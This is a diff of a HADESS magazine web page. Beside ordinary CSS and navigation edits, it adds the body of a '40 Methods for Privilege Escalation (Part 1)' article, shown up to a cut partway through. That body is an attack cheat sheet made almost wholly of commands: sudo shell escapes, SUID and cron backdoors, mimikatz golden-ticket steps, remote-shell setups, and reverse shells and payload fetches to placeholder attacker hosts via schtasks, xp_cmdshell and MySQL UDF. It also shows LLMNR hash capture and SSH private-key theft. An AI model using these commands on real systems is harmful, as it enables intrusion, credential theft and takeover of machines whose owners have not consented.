@@ -124,6 +124,18 @@ img{display:block;max-width:100%}
   .mag-nav-main{padding:14px 20px}
   .post-grid{grid-template-columns:1fr}
 }
+@media(max-width:560px){
+  .mag-cta{display:none}
+}
+/* the magazine's carousels are styled further down the page; while it streams in they would
+   lay out full-width and phones lock the zoom at ~700px. Constrain them from the <head>. */
+.grid-cinematic,.shelf-track{overflow-x:auto;max-width:100%}
+@media(max-width:768px){
+  html,body{overflow-x:hidden}
+  .article-content img,.article-content video,.article-content iframe{max-width:100%;height:auto}
+  .article-content table{display:block;max-width:100%;overflow-x:auto}
+  .article-content pre{max-width:100%;overflow-x:auto}
+}
 @media(max-width:480px){
   .card-img-wrap,.card-img-placeholder{height:180px}
 }
@@ -1270,7 +1282,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     }
 }
 </style>
-<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://hadesssecurity.github.io/blog/read/40-methods-for-privilege-escalationpart-1#article","headline":"40 Methods for Privilege Escalation(Part 1) — HADESS Magazine","description":"Abusing Sudo Binaries\n\n\n\nDomain: No\n\n\n\nLocal Admin: Yes\n\n\n\nOS: Linux\n\n\n\nType: &nbsp;Abusing Privileged Files\n\n\n\nMethods:&nbsp;\n\n\n\nsudo vim -c ':!/bin/bash'sudo...","url":"https://hadesssecurity.github.io/blog/read/40-methods-for-privilege-escalationpart-1","mainEntityOfPage":{"@type":"WebPage","@id":"https://hadesssecurity.github.io/blog/read/40-methods-for-privilege-escalationpart-1"},"datePublished":"August 12, 2022","author":{"@type":"Organization","name":"hadess"},"publisher":{"@type":"Organization","name":"HADESS","url":"https://hadesssecurity.github.io","logo":{"@type":"ImageObject","url":"https://career.hadess.io/logo-white.png"}},"image":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2022/08/40-Methods-For-Privilege-Escalation-Part-1.png"}}]}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://hadesssecurity.github.io/blog/read/40-methods-for-privilege-escalationpart-1#article","headline":"40 Methods for Privilege Escalation(Part 1) — HADESS Magazine","description":"Abusing Sudo Binaries\n\n\n\nDomain: No\n\n\n\nLocal Admin: Yes\n\n\n\nOS: Linux\n\n\n\nType: &nbsp;Abusing Privileged Files\n\n\n\nMethods:&nbsp;\n\n\n\nsudo vim -c ':!/bin/bash'sudo...","url":"https://hadesssecurity.github.io/blog/read/40-methods-for-privilege-escalationpart-1","mainEntityOfPage":{"@type":"WebPage","@id":"https://hadesssecurity.github.io/blog/read/40-methods-for-privilege-escalationpart-1"},"datePublished":"August 12, 2022","author":{"@type":"Organization","name":"hadess"},"publisher":{"@type":"Organization","name":"HADESS","url":"https://hadesssecurity.github.io","logo":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2022/06/Hadess-Cybersecurity.jpg"}},"image":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2022/08/40-Methods-For-Privilege-Escalation-Part-1.png"}}]}</script>
 <!-- Force our dark theme; hide ALL default WP theme output -->
 <style>
 html,body{background:var(--bg)!important;color:var(--text)!important;font-family:var(--font)!important}
@@ -1323,14 +1335,13 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
       <span>Friday, October 2, 2026</span>
     </div>
     <div class="mag-nav-top-right">
-      <a href="mailto:career@hadess.io">Contact</a>
-      <a href="https://career.hadess.io/privacy">Privacy</a>
-      <a href="https://career.hadess.io/terms">Terms</a>
+      <a href="mailto:security@hadess.io">Contact</a>
+      <a href="/products/">Products &amp; Services</a>
       <div class="mag-social">
         <a href="https://www.linkedin.com/company/hadess-security/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
         <a href="https://x.com/Hadess_security" target="_blank" rel="noopener noreferrer" aria-label="X"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
         <a href="https://github.com/hadessCs" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a>
-        <a href="mailto:career@hadess.io" aria-label="Email"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
+        <a href="mailto:security@hadess.io" aria-label="Email"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
       </div>
     </div>
   </div>
@@ -1348,16 +1359,16 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
               <a href="/blog?cat=104">Skills &amp; Certifications</a>
               <a href="/blog?cat=76">Career Guide</a>
               <a href="/blog?cat=23">White Paper</a>
-            <a href="https://career.hadess.io/games/">Hack &amp; Learn</a>
+            <a href="/products/">Products &amp; Services</a>
     </div>
     <a href="/blog/search" class="mag-search-btn">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35" stroke-linecap="round"/></svg>
       Search...
       <kbd>/</kbd>
     </a>
-    <a href="https://career.hadess.io/login" class="mag-cta">
+    <a href="/products/#contact" class="mag-cta">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Launch Career Platform
+      Talk to an Expert
     </a>
     <button class="mag-hamburger" onclick="document.getElementById('mobileMenu').classList.add('open')">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M4 6h16M4 12h16M4 18h16" stroke-linecap="round"/></svg>
@@ -1374,8 +1385,8 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
       <a href="/blog?cat=76">Career Guide</a>
       <a href="/blog?cat=23">White Paper</a>
     <a href="/blog/search">Search</a>
-  <a href="https://career.hadess.io/games/">Hack &amp; Learn</a>
-  <a href="https://career.hadess.io/login" style="color:var(--gold)">Launch Career Platform</a>
+  <a href="/products/">Products &amp; Services</a>
+  <a href="/products/#contact" style="color:var(--gold)">Talk to an Expert</a>
 </div>
 
 <!-- ═══ PAGE-SPECIFIC STYLES ═══ -->
@@ -1587,11 +1598,1633 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
   <div class="article-content-col">
     <div class="article-content" data-pagefind-body data-pagefind-meta="image:/wp-content/uploads/2022/08/40-Methods-For-Privilege-Escalation-Part-1.png">
       
-<p class="wp-block-paragraph">Organizations across various domains—ranging from traditional IT security to AI-driven initiatives—are turning to Key Performance Indicators (KPIs) to measure progress and ensure sustainable results. Through the SMART framework, each KPI is crafted to be Specific, Measurable, Achievable, Relevant, and Time-Bound, enabling teams to focus on precise outcomes like minimizing detection time, improving patch compliance, and raising awareness through targeted security training. Real-world examples—from ShieldCore’s SOC transformation to DevOps-driven improvements at BetaWorks and AI model security at AlphaVision—underscore how these metrics reduce risks, streamline incident response, and bolster regulatory adherence.</p>
+<h1 class="wp-block-heading" id="h-abusing-sudo-binaries">Abusing Sudo Binaries</h1>
 
 
 
-<p class="wp-block-paragraph">Across all these cases, core KPIs consistently monitor early threat detection, timely response, comprehensive coverage of system defenses, and the recurrence of specific security incidents. By tracking these measurements in cloud-focused, DevOps, AI, or traditional environments, organizations uncover vulnerabilities, optimize resources, and adopt a proactive stance toward safeguarding data and infrastructure. This unified approach to KPI-driven improvements delivers tangible accountability and ongoing governance, ensuring that security initiatives remain aligned with strategic business goals.</p>
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Abusing Privileged Files</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ol class="wp-block-list"><li>sudo vim -c &#8216;:!/bin/bash&#8217;</li><li>sudo find / etc/passwd -exec /bin/bash \;</li><li>echo &#8220;os.execute(&#8216;/bin/bash/&#8217;)&#8221; &gt; /tmp/shell.nse &amp;&amp; sudo nmap &#8211;script=/tmp/shell.nse</li><li>sudo env /bin/bash</li><li>sudo awk &#8216;BEGIN {system(&#8220;/bin/bash&#8221;)}&#8217;</li><li>sudo perl -e &#8216;exec &#8220;/bin/bash&#8221;;&#8217;</li><li>sudo python -c &#8216;import pty;pty.spawn(&#8220;/bin/bash&#8221;)&#8217;</li><li>sudo less /etc/hosts &#8211; !bash</li><li>sudo man man &#8211; !bash</li><li>sudo ftp &#8211; ! /bin/bash</li><li>Attacker = socat file:`tty`,raw,echo=0 tcp-listen:1234</li><li>Victim = sudo socat exec:&#8217;sh -li&#8217;,pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234</li><li>echo test &gt; notes.txt</li><li>sudo zip test.zip notes.txt -T &#8211;unzip-command=&#8221;sh -c /bin/bash&#8221;</li><li>sudo gcc -wrapper /bin/bash,-s .</li><li>sudo docker run -v /:/mnt &#8211;rm -it alpine chroot /mnt sh</li><li>sudo mysql -e &#8216;\! /bin/sh&#8217;</li><li>sudo ssh -o ProxyCommand=&#8217;;sh 0&lt;&amp;2 1&gt;&amp;2&#8242; x</li><li>Sudo tmux</li><li>sudo pkexec /bin/bash</li><li>sudo rlwrap /bin/bash</li><li>sudo xargs -a /dev/null sh</li><li>sudo /home/anansi/bin/anansi_util manual /bin/bash&nbsp;&nbsp;</li><li>sudo apt-get update -o APT::Update::Pre-Invoke::=”/bin/bash -i”</li><li>echo &#8216;import pty; pty.spawn(“/bin/bash”)&#8217; &gt; flask.py</li><li>export FLASK_APP=flask.py</li><li>sudo /usr/bin/flask run<br></li><li>sudo apache2 -f /etc/shadow<br>john hash &#8211;wordlist=/usr/share/wordlists/rockyou.txt</li></ol>
+
+
+
+<h1 class="wp-block-heading" id="h-abusing-scheduled-tasks">Abusing Scheduled Tasks</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Y/N</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux</p>
+
+
+
+<p class="wp-block-paragraph">Type:&nbsp; Abusing Scheduled Tasks</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ol class="wp-block-list"><li>echo &#8216;chmod +s /bin/bash&#8217; &gt; /home/user/systemupdate.sh</li><li>chmod +x /home/user/systemupdate.sh</li><li>Wait a while</li><li>/bin/bash -p</li><li>id &amp;&amp; whoami</li></ol>
+
+
+
+<h1 class="wp-block-heading" id="h-golden-ticket-with-scheduled-tasks">Golden Ticket With Scheduled Tasks</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Abusing Scheduled Tasks</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">1.mimikatz# token::elevate</p>
+
+
+
+<p class="wp-block-paragraph">2.mimikatz# vault::cred /patch</p>
+
+
+
+<p class="wp-block-paragraph">3.mimikatz# lsadump::lsa /patch</p>
+
+
+
+<p class="wp-block-paragraph">4.mimikatz# kerberos::golden /user:Administrator /rc4:&lt;Administrator NTLM(step 3)&gt; /domain:&lt;DOMAIN&gt; /sid:&lt;USER SID&gt; /sids:&lt;Administrator SIDS&gt; /ticket:&lt;OUTPUT TICKET PATH&gt;</p>
+
+
+
+<p class="wp-block-paragraph">5.powercat -l -v -p 443</p>
+
+
+
+<p class="wp-block-paragraph">6.schtasks /create /S DOMAIN /SC Weekly /RU &#8220;NT Authority\SYSTEM&#8221; /TN &#8220;enterprise&#8221; /TR &#8220;powershell.exe-c &#8216;iex (iwr http://10.10.10.10/reverse.ps1)&#8217;”</p>
+
+
+
+<p class="wp-block-paragraph">7.schtasks /run /s DOMAIN /TN &#8220;enterprise”</p>
+
+
+
+<h1 class="wp-block-heading" id="h-abusing-interpreter-capabilities">Abusing Interpreter Capabilities</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux</p>
+
+
+
+<p class="wp-block-paragraph">Type:&nbsp; Abusing Capabilities</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ol class="wp-block-list"><li>getcap -r / 2&gt;/dev/null&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<ol><li>/usr/bin/python2.6 = cap_setuid+ep</li><li>/usr/bin/python2.6 -c &#8216;import os; os.setuid(0); os.system(&#8220;/bin/bash&#8221;)&#8217;</li><li>id &amp;&amp; whoami</li></ol></li><li>getcap -r / 2&gt;/dev/null&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<ol><li>/usr/bin/perl = cap_setuid+ep</li><li>/usr/bin/perl -e &#8216;use POSIX (setuid); POSIX::setuid(0); exec &#8220;/bin/bash&#8221;;&#8217;</li><li>id &amp;&amp; whoami</li></ol></li></ol>
+
+
+
+<h1 class="wp-block-heading" id="h-abusing-binary-capabilities">Abusing Binary Capabilities</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux</p>
+
+
+
+<p class="wp-block-paragraph">Type:&nbsp; Abusing Capabilities</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ol class="wp-block-list"><li>getcap -r / 2&gt;/dev/null&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<ol><li>/usr/bin/tar = cap dac read search+ep</li><li>/usr/bin/tar -cvf key.tar /root/.ssh/id_rsa</li><li>/usr/bin/tar -xvf key.tar</li></ol></li><li>openssl req -engine /tmp/priv.so<ol><li>/bin/bash -p</li><li>id &amp;&amp; whoami</li></ol></li></ol>
+
+
+
+<h1 class="wp-block-heading" id="h-abusing-activesessions-capabilities">Abusing ActiveSessions Capabilities</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type:&nbsp; Abusing Capabilities</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
+https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-SQLOSCmd.ps1
+</div></figure>
+
+
+
+<p class="wp-block-paragraph">. .\Heidi.ps1</p>
+
+
+
+<p class="wp-block-paragraph">Invoke-SQLOCmd -Verbose -Command “net localgroup administrators user1 /add” -Instance COMPUTERNAME</p>
+
+
+
+<h1 class="wp-block-heading" id="h-escalate-with-trustworthy-in-sql-server">Escalate with TRUSTWORTHY in SQL Server</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type:&nbsp; Abusing Capabilities</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">1. . .\PowerUpSQL.ps1</p>
+
+
+
+<p class="wp-block-paragraph">2. Get-SQLInstanceLocal -Verbose</p>
+
+
+
+<p class="wp-block-paragraph">3. (Get-SQLServerLinkCrawl -Verbos -Instance &#8220;10.10.10.10&#8221; -Query &#8216;select * from master..sysservers&#8217;).customer.query</p>
+
+
+
+<p class="wp-block-paragraph">4.&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">USE &#8220;master&#8221;;</p>
+
+
+
+<p class="wp-block-paragraph">SELECT *, SCHEMA_NAME(&#8220;schema_id&#8221;) AS &#8216;schema&#8217; FROM &#8220;master&#8221;.&#8221;sys&#8221;.&#8221;objects&#8221; WHERE &#8220;type&#8221; IN (&#8216;P&#8217;, &#8216;U&#8217;, &#8216;V&#8217;, &#8216;TR&#8217;, &#8216;FN&#8217;, &#8216;TF, &#8216;IF&#8217;);</p>
+
+
+
+<p class="wp-block-paragraph">execute(&#8216;sp_configure &#8220;xp_cmdshell&#8221;,1;RECONFIGURE&#8217;) at &#8220;&lt;DOMAIN&gt;\&lt;DATABASE NAME&gt;&#8221;</p>
+
+
+
+<p class="wp-block-paragraph">5. powershell -ep bypass</p>
+
+
+
+<p class="wp-block-paragraph">6. Import-Module .\powercat.ps1</p>
+
+
+
+<p class="wp-block-paragraph">7. powercat -l -v -p 443 -t 10000</p>
+
+
+
+<p class="wp-block-paragraph">8.</p>
+
+
+
+<p class="wp-block-paragraph">SELECT *, SCHEMA_NAME(&#8220;schema_id&#8221;) AS &#8216;schema&#8217; FROM &#8220;master&#8221;.&#8221;sys&#8221;.&#8221;objects&#8221; WHERE &#8220;type&#8221; IN (&#8216;P&#8217;, &#8216;U&#8217;, &#8216;V&#8217;, &#8216;TR&#8217;, &#8216;FN&#8217;, &#8216;TF, &#8216;IF&#8217;);</p>
+
+
+
+<p class="wp-block-paragraph">execute(&#8216;sp_configure &#8220;xp_cmdshell&#8221;,1;RECONFIGURE&#8217;) at &#8220;&lt;DOMAIN&gt;\&lt;DATABASE NAME&gt;&#8221;&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">execute(&#8216;exec master..xp_cmdshell &#8220;\\10.10.10.10\reverse.exe&#8221;&#8216;) at &#8220;&lt;DOMAIN&gt;\&lt;DATABASE NAME&gt;&#8221;</p>
+
+
+
+<h1 class="wp-block-heading" id="h-abusing-mysql-run-as-root">Abusing Mysql run as root</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Abusing Services</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list"><li>ps aux | grep root</li></ul>
+
+
+
+<p class="wp-block-paragraph">mysql -u root -p</p>
+
+
+
+<p class="wp-block-paragraph">\! chmod +s /bin/bash</p>
+
+
+
+<p class="wp-block-paragraph">Exit</p>
+
+
+
+<p class="wp-block-paragraph">/bin/bash -p&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">id &amp;&amp; whoami</p>
+
+
+
+<h1 class="wp-block-heading" id="h-abusing-journalctl">Abusing journalctl</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux</p>
+
+
+
+<p class="wp-block-paragraph">Type:&nbsp; Abusing Services</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list"><li>Journalctl</li><li>!/bin/sh</li></ul>
+
+
+
+<h1 class="wp-block-heading" id="h-abusing-vds">Abusing VDS</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type:&nbsp; Abusing Services</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">. .\PowerUp.ps1</p>
+
+
+
+<p class="wp-block-paragraph">Invoke-ServiceAbuse -Name ‘vds’ -UserName ‘domain\user1’</p>
+
+
+
+<h1 class="wp-block-heading" id="h-abusing-browser">Abusing Browser</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type:&nbsp; Abusing Services</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">. .\PowerUp.ps1</p>
+
+
+
+<p class="wp-block-paragraph">Invoke-ServiceAbuse -Name ‘browser’ -UserName ‘domain\user1’</p>
+
+
+
+<h1 class="wp-block-heading" id="h-abusing-ldap">Abusing LDAP</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux</p>
+
+
+
+<p class="wp-block-paragraph">Type:&nbsp; Abusing Services</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">0. exec ldapmodify -x -w PASSWORD</p>
+
+
+
+<p class="wp-block-paragraph">1. paste this</p>
+
+
+
+<p class="wp-block-paragraph">dn: cn=openssh-lpk,cn=schema,cn=config</p>
+
+
+
+<p class="wp-block-paragraph">objectClass: olcSchemaConfig</p>
+
+
+
+<p class="wp-block-paragraph">cn: openssh-lpk</p>
+
+
+
+<p class="wp-block-paragraph">olcAttributeTypes: ( 1.3.6.1.4.1.24552.500.1.1.1.13 NAME &#8216;sshPublicKey&#8217;&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;DESC &#8216;MANDATORY: OpenSSH Public key&#8217;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;EQUALITY octetStringMatch</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;SYNTAX 1.3.6.1.4.1.1466.115.121.1.40 )</p>
+
+
+
+<p class="wp-block-paragraph">olcObjectClasses: ( 1.3.6.1.4.1.24552.500.1.1.2.0 NAME &#8216;ldapPublicKey&#8217; SUP top AUXILIARY</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;DESC &#8216;MANDATORY: OpenSSH LPK objectclass&#8217;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;MAY ( sshPublicKey $ uid )&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;)</p>
+
+
+
+<p class="wp-block-paragraph">2. exec ldapmodify -x -w PASSWORD</p>
+
+
+
+<p class="wp-block-paragraph">3. paste this</p>
+
+
+
+<p class="wp-block-paragraph">dn: uid=UID,ou=users,ou=linux,ou=servers,dc=DC,dc=DC</p>
+
+
+
+<p class="wp-block-paragraph">changeType: modify</p>
+
+
+
+<p class="wp-block-paragraph">add: objectClass</p>
+
+
+
+<p class="wp-block-paragraph">objectClass: ldapPublicKey</p>
+
+
+
+<p class="wp-block-paragraph">&#8211;</p>
+
+
+
+<p class="wp-block-paragraph">add: sshPublicKey</p>
+
+
+
+<p class="wp-block-paragraph">sshPublicKey: content of id_rsa.pub</p>
+
+
+
+<p class="wp-block-paragraph">&#8211;</p>
+
+
+
+<p class="wp-block-paragraph">replace: EVIL GROUP ID</p>
+
+
+
+<p class="wp-block-paragraph">uidNumber: CURRENT USER ID</p>
+
+
+
+<p class="wp-block-paragraph">&#8211;</p>
+
+
+
+<p class="wp-block-paragraph">replace: EVIL USER ID</p>
+
+
+
+<p class="wp-block-paragraph">gidNumber: CURRENT GROUP ID</p>
+
+
+
+<h1 class="wp-block-heading" id="h-llmnr-poisoning">LLMNR Poisoning</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Y/N</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Abuse Service</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">1.responder -I eth1 -v</p>
+
+
+
+<p class="wp-block-paragraph">2.create Book.url</p>
+
+
+
+<p class="wp-block-paragraph">[InternetShortcut]</p>
+
+
+
+<p class="wp-block-paragraph">URL=<a href="https://facebook.com">https://facebook.com</a></p>
+
+
+
+<p class="wp-block-paragraph">IconIndex=0</p>
+
+
+
+<p class="wp-block-paragraph">IconFile=\\attacker_ip\not_found.ico</p>
+
+
+
+<h1 class="wp-block-heading" id="h-abusing-certificate-services">Abusing Certificate Services</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Y/N</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Abuse Service</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">adcspwn.exe &#8211;adcs &lt;cs server&gt; &#8211;port [local port] &#8211;remote [computer]</p>
+
+
+
+<p class="wp-block-paragraph">adcspwn.exe &#8211;adcs cs.pwnlab.local</p>
+
+
+
+<p class="wp-block-paragraph">adcspwn.exe &#8211;adcs cs.pwnlab.local &#8211;remote dc.pwnlab.local &#8211;port 9001</p>
+
+
+
+<p class="wp-block-paragraph">adcspwn.exe &#8211;adcs cs.pwnlab.local &#8211;remote dc.pwnlab.local &#8211;output C:\Temp\cert_b64.txt</p>
+
+
+
+<p class="wp-block-paragraph">adcspwn.exe &#8211;adcs cs.pwnlab.local &#8211;remote dc.pwnlab.local &#8211;username pwnlab.local\mranderson &#8211;password The0nly0ne! &#8211;dc dc.pwnlab.local</p>
+
+
+
+<h1 class="wp-block-heading" id="h-mysql-udf-code-injection">MySQL UDF Code Injection</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Injection</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">mysql -u root -p</p>
+
+
+
+<p class="wp-block-paragraph">mysql&gt; use mysql;</p>
+
+
+
+<p class="wp-block-paragraph">mysql&gt; create table admin(line blob);</p>
+
+
+
+<p class="wp-block-paragraph">mysql&gt; insert into admin values(load_file(&#8216;/tmp/lib_mysqludf_sys.so&#8217;));</p>
+
+
+
+<p class="wp-block-paragraph">mysql&gt; select * from admin into dumpfile &#8216;/usr/lib/lib_mysqludf_sys.so&#8217;;</p>
+
+
+
+<p class="wp-block-paragraph">mysql&gt; create function sys_exec returns integer soname &#8216;lib_mysqludf_sys.so&#8217;;</p>
+
+
+
+<p class="wp-block-paragraph">mysql&gt; select sys_exec(&#8216;bash -i &gt;&amp; /dev/tcp/10.10.10.10/9999 0&gt;&amp;1&#8217;);</p>
+
+
+
+<h1 class="wp-block-heading" id="h-impersonation-token-with-impersonateloggedonuser">Impersonation Token with ImpersonateLoggedOnuser</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Injection</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">1.SharpImpersonation.exe user:&lt;user&gt; shellcode:&lt;URL&gt;</p>
+
+
+
